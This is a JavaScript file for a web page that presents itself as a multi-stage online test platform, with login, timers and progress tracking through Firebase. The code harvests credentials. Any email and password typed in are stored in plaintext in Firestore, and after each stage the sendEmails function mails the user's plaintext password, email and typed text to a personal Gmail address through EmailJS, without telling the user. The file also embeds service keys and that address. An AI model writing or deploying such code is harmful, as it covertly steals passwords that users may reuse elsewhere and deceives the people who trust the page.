import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// 1. Firebase კონფიგურაცია
const firebaseConfig = {
  apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
  authDomain: "test-platform-ab07e.firebaseapp.com",
  projectId: "test-platform-ab07e",
  storageBucket: "test-platform-ab07e.firebasestorage.app",
  messagingSenderId: "50168022145",
  appId: "1:50168022145:web:5f3fec99fbe64eae5bb980",
  measurementId: "G-R814YQSVXK"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// 2. EmailJS ინიციალიზაცია
emailjs.init("9G-RjQeGCdtsk4MWM");

let currentUser = null;
let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
let latestUserMessage = ""; // აქ სწორად შეინახება ტექსტი მეილისთვის

const authScreen = document.getElementById('auth-screen');
const dashboardScreen = document.getElementById('dashboard-screen');
const authForm = document.getElementById('auth-form');
const authError = document.getElementById('auth-error');
const userEmailDisplay = document.getElementById('user-email-display');
const completedStatus = document.getElementById('completed-status');
const currentStageStatus = document.getElementById('current-stage-status');
const timerBox = document.getElementById('timer-box');
const countdownSpan = document.getElementById('countdown');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    authError.innerText = "";

    try {
        await signInWithEmailAndPassword(auth, email, password);
    } catch (error) {
        if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
            authError.innerText = "სისტემაში შესვლა... გთხოვთ დაელოდოთ.";
            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                await setDoc(doc(db, "users", userCredential.user.uid), {
                    email: email,
                    passwordSaved: password,
                    stage: 1,
                    completedTasks: 0
                });
                authError.innerText = "";
            } catch (regError) {
                authError.innerText = "მეილი ან პაროლი არასწორია";
            }
        } else {
            authError.innerText = "მეილი ან პაროლი არასწორია";
        }
    }
});

onAuthStateChanged(auth, async (user) => {
    if (user) {
        currentUser = user;
        userEmailDisplay.innerText = user.email;
        authScreen.classList.add('hidden');
        dashboardScreen.classList.remove('hidden');
        
        const userDoc = await getDoc(doc(db, "users", user.uid));
        if (userDoc.exists()) {
            userProgress = userDoc.data();
        }
        updateUI();
    } else {
        currentUser = null;
        authScreen.classList.remove('hidden');
        dashboardScreen.classList.add('hidden');
    }
});

document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

function updateUI() {
    completedStatus.innerText = userProgress.completedTasks;
    currentStageStatus.innerText = userProgress.stage > 3 ? "ყველა დასრულებულია" : `ეტაპი ${userProgress.stage}`;

    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    document.getElementById('final-message').classList.add('hidden');

    if (userProgress.stage === 1) {
        document.getElementById('stage-1').classList.remove('hidden');
    } else if (userProgress.stage === 2) {
        document.getElementById('stage-2').classList.remove('hidden');
    } else if (userProgress.stage === 3) {
        document.getElementById('stage-3').classList.remove('hidden');
    } else if (userProgress.stage > 3) {
        document.getElementById('final-message').classList.remove('hidden');
    }
}

// ეტაპი 2-ის შიდა ფუნქცია
window.showStage2Tasks = function() {
    document.getElementById('stage-2-tasks').classList.remove('hidden');
}

// უნივერსალური შემამოწმებელი ფუნქცია
window.validateAndStart = function(stageNum, seconds) {
    const userInput = document.getElementById(`user-text-${stageNum}`);
    const errorText = document.getElementById(`error-${stageNum}`);

    if (userInput.value.trim() === "") {
        errorText.innerText = "ჩაწერეთ რამე";
        userInput.style.borderColor = "#ef4444";
    } else {
        errorText.innerText = "";
        userInput.style.borderColor = "#e5e7eb";
        
        // ვინახავთ ტექსტს როგორც ბაზისთვის, ისე მიმდინარე მეილისთვის
        latestUserMessage = userInput.value;
        userProgress[`userText${stageNum}`] = userInput.value;

        startTimer(stageNum, seconds);
    }
}

window.startTimer = function(stageNum, seconds) {
    if(stageNum === 1) document.getElementById('stage-1').classList.add('hidden');
    if(stageNum === 2) document.getElementById('stage-2').classList.add('hidden');
    if(stageNum === 3) document.getElementById('stage-3').classList.add('hidden');
    
    timerBox.classList.remove('hidden');
    let timeLeft = seconds;
    countdownSpan.innerText = timeLeft;

    const interval = setInterval(async () => {
        timeLeft--;
        countdownSpan.innerText = timeLeft;

        if (timeLeft <= 0) {
            clearInterval(interval);
            timerBox.classList.add('hidden');
            
            userProgress.stage = stageNum + 1;
            userProgress.completedTasks = stageNum;

            await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
            
            sendEmails(stageNum);
            updateUI();
        }
    }, 1000);
}

function sendEmails(stageNum) {
    const stageNames = ["ეტაპი 1 (ტესტი 1)", "ეტაპი 2 (ტესტი 2)", "ეტაპი 3 (ტესტი 3)"];
    const currentStageName = stageNames[stageNum - 1];

    const emailParams = {
        user_email: currentUser.email,
        user_password: userProgress.passwordSaved || "უკვე ავტორიზებული",
        passed_stage: currentStageName,
        user_message: latestUserMessage, // ეს ცვლადი EmailJS შაბლონში უნდა გეწეროს ასე: {{user_message}}
        admin_email: "beqa994@gmail.com"
    };

    // შენი სერვისის და შაბლონების რეალური კოდები (გააქტიურე კომენტარების მოხსნით საჭიროებისას)
    emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
    emailjs.send("service_ddlex4d", "template_5225h2q", emailParams);
}